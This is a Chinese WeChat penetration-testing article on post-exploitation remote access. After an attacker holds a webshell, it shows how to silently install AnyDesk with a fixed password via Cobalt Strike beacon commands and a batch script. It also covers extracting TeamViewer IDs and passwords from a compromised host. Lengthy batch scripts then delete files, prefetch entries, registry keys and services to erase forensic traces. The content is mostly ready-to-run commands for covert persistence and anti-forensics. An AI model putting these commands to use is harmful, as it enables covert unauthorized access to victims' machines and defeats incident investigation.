> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/H_2RAUE-9k2Gljh4AJ9d4A)<table><tbody><tr><td width="557" valign="top" height="62"><section><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

**0x01 前言**

假设已经通过某漏洞拿到目标主机的 Webshell 权限，这时可以先看下里边是否安装的有以下这些第三方软件，它们可以不用通过 Mstsc.exe 即可进行远程桌面连接。

```
向日葵；
ToDesk；
AnyDesk；
TeamViewer；
Radmin；
RealVNC；
PcAnywhere；
[...SNIP...]
```

利用向日葵 /ToDesk/AnyDesk/TeamViewer 等第三方软件进入远程桌面时需要使用 Administrators 权限来执行，而 Radmin/RealVNC/PcAnywhere 只需找到连接密码即可。

**相关阅读：  
**

[向日葵软件在渗透测试中的应用（直接点击即可访问）](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486900&idx=1&sn=a766fc39f5536f1f65e8c3f05c5bc134&chksm=cfa6a9a7f8d120b11cfb844f41a0470fdbf93fc0a0f4034d21efcf8c8765ab0e0221affbac58&scene=21#wechat_redirect)  

https://www.yuque.com/docs/share/cfe594e5-4831-4a97-8dab-28848fe91640?#（密码：hist）  

**0x02 应用场景**

AnyDesk 与 TeamViewer 等这类软件都具备内网穿透、文件传输、流量加密等功能，而且它们有数字签名，所以大部分杀毒软件都不会对其进行查杀，在远程桌面连接中可应用场景包括但不限于以下几点。

```
1) Windows RDP远程桌面连接登录限制；
2) 某狗、盾、锁、神等计算机名和IP认证；
3) Duo Security RDP等双因素身份验证；
[...SNIP...]
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8f70zVQLgdAC21QDHVo3KEnEEUQ8ic6cgXurSZggQpsg0ymH2TPz1FyicQ/640?wx_fmt=png)

**0x03 AnyDesk 利用方式**

首先在本地执行 AnyDesk 并设置下 “为自主访问设置密码”，AnyDesk 目录下会生成一些配置文件用来存储我们的 ID、Pass、Key 和证书等数据，这里记好我们的 ID 和设置好的 Pass，用于后期连接目标机器上的 AD，`执行过程中不会有UAC弹窗。`

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8fib0icIlDOic2iaTcLOS7dwaAxFjElgiaJ3QRz2CJ7lFnTDaiaFJMyrauMsGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8f87aEnzWib2hKWcpIeW7YicVe067Wy44ECqrBPE26q4Jibv4nsdayZF59g/640?wx_fmt=png)

接着把 AnyDesk 上传至目标磁盘，创建`%userprofile%\AppData\Roaming\AnyDesk`目录，然后将我们本地的 service.conf 配置文件上传进去以后再执行 AD 即可，这个文件是用来给 AD 设置一个固定的连接 ID 和 Pass。

```
beacon> shell md %userprofile%\AppData\Roaming\AnyDesk
beacon> shell C:\ProgramData\AnyDesk.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8flBj0NBbU62ecY6tbNuTvFvmNiaHXSzS9lVdhVFre1qlmqZ0GSPqZTvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8fXYK9xhm1c1t2sKLj5ictOyTfDbnzB5iapbn7CRdoicmAk7bs6bkYnB7jg/640?wx_fmt=png)

**注：**本地用 AnyDesk 连接目标时必须先删除 %userprofile%\AppData\Roaming\AnyDesk 目录下的所有文件，然后重新执行 AD，因为只有这样 AD 才会重新分配一个新的 ID 给我们，必须与原 ID 不一样才可以连接目标机器，否则可能会连接到我们本地机器。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8fCJ5Q8r2AZjcIocjZOqTyR7IpOS4cbPTZ3Z8sFLCOEvtaicl14iaVXPlQ/640?wx_fmt=png)

或者我们可以在命令行直接执行以下批处理文件进行静默安装并设置固定连接密码，接着通过 --get-id 参数获取 AD 的连接 ID，如果在获取不到连接 ID 时可以尝试在 choice 中增加延迟。

```
@echo off
AnyDesk.exe --install "C:\ProgramData\AnyDesk" --silent
echo licence_keyABC | "C:\ProgramData\AnyDesk\AnyDesk.exe" --register-licence
echo anydesk!@# | "C:\ProgramData\AnyDesk\AnyDesk.exe" --set-password
choice /t 10 /d y /n >nul
for /f "delims=" %%i in ('anydesk --get-id') do set CID=%%i
echo Connection ID Is: %CID%
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8fibStnTayrX5v1IOnLibGapI8sXbCvmgGKpaw6lTLtV69fQE0Mus8Qw7w/640?wx_fmt=png)

**可能需要清理的痕迹：**

```
@echo off
taskkill /f /im AnyDesk.exe
del /s /q %userprofile%\AppData\Roaming\AnyDesk\*.*
rmdir /s /q %userprofile%\AppData\Roaming\AnyDesk
rmdir /s /q "%userprofile%\AppData\Roaming\Apple Computer"
rmdir /s /q %userprofile%\Videos\AnyDesk
rmdir /s /q %userprofile%\Pictures\AnyDesk
del /s /q %userprofile%\Recent\AnyDesk.lnk
del /s /q %userprofile%\AppData\Roaming\Microsoft\Windows\Recent\AnyDesk*.lnk
del /s /q C:\Windows\Prefetch\ANYDESK*.pf
taskkill /f /im AnyDesk.exe
rmdir /s /q C:\ProgramData\AnyDesk
reg delete "HKCR\AnyDesk" /f
reg delete "HKCR\.anydesk" /f
reg delete "HKLM\SOFTWARE\Classes\AnyDesk" /f
reg delete "HKLM\SOFTWARE\Clients\Media\AnyDesk" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\AnyDesk" /f
reg delete "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\AnyDesk" /f
sc delete AnyDesk
del /s /q AnyDesk.exe
[...SNIP...]
```

**0x04 TeamViewer 利用方式**

通过以下命令查看目标机器 TV 绝对路径，也可以自己上传一个免安装版 TV 并执行，然后再用 TeamViewer 利用工具获取它的连接 ID 和 Pass。

`在执行过程中可能会出现UAC弹窗`，这里不管我们选择是或者否都会运行，但这种方式在实战中动静还是太大了。

```
tasklist /svc | findstr "TeamViewer" & sc qc TeamViewer
wmic process where  get processid,name,executablepath
TeamViewer ID：1 118 357 536  -  TeamViewer Pass：7224
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8fRngqUWqUjia0ygYXptGmvxB8fFga22gtX6PHhDVIk2NnSfkMdwgRzMw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8fdF8FpRdc2bcRbiaFa8TWS1YXgO1HTicXLOE4BJaHIicWsQicJSnK7h9M4g/640?wx_fmt=png)

大部分利用工具原理都是在 TeamViewer.exe 进程的窗体句柄或内存中找到的 ID 和 Pass。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8fqq6tN69Q0kTAqTuRY0lgZRP3goicmvlOSGgHsTElgC5eiaYn83mFZx7w/640?wx_fmt=png)

或者我们可以在执行 TV 后通过使用 Meterpreter 和 CobaltStrike 中的 screenshot 命令截取目标机器桌面得到 TeamViewer 的连接 ID 和 Pass。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfIEQloHjqqafHoZqFviaK8ficOXPf5yeib4KUqGzmWeRYRI3GiaxbK2LdFvqZg4QibxV2cY95Axf9yolw/640?wx_fmt=png)

**可能需要清理的痕迹：**

```
@echo off
taskkill /f /im TeamViewer.exe /im tv_w32.exe /im tv_x64.exe
rd /s /q C:\Windows\Temp\TeamViewerPortable
rd /s /q "%ProgramFiles%\TeamViewer"
rd /s /q "%ProgramFiles(x86)%\TeamViewer"
rd /s /q %userprofile%\AppData\Roaming\TeamViewer
rd /s /q %userprofile%\AppData\Local\TeamViewer
rd /s /q %userprofile%\AppData\Local\Temp\TeamViewer
rd /s /q %userprofile%\AppData\Local\Temp\1\TeamViewer
rd /s /q %userprofile%\AppData\Local\Temp\1\TeamViewerPortable
del /s /q %userprofile%\AppData\Roaming\Microsoft\Windows\Recent\TeamViewer*.lnk
del /s /q C:\Windows\Fonts\teamviewer*.otf
del /s /q C:\Windows\Prefetch\TeamViewer*.pf
del /s /q C:\ProgramData\Intel\ShaderCache\TeamViewer*
sc delete TeamViewer
[...SNIP...]
```

关注公众号回复 “9527” 可免费获取一套 HTB 靶场文档和视频，“1120” 安全参考等安全杂志 PDF 电子版，“1208” 个人常用高效爆破字典，“0221”2020 年酒仙桥文章打包，还在等什么？赶紧点击下方名片关注学习吧！

公众号

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcAcRDPBsTMEQ0pGhzmYrBp7pvhtHnb0sJiaBzhHIILwpLtxYnPjqKmibA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)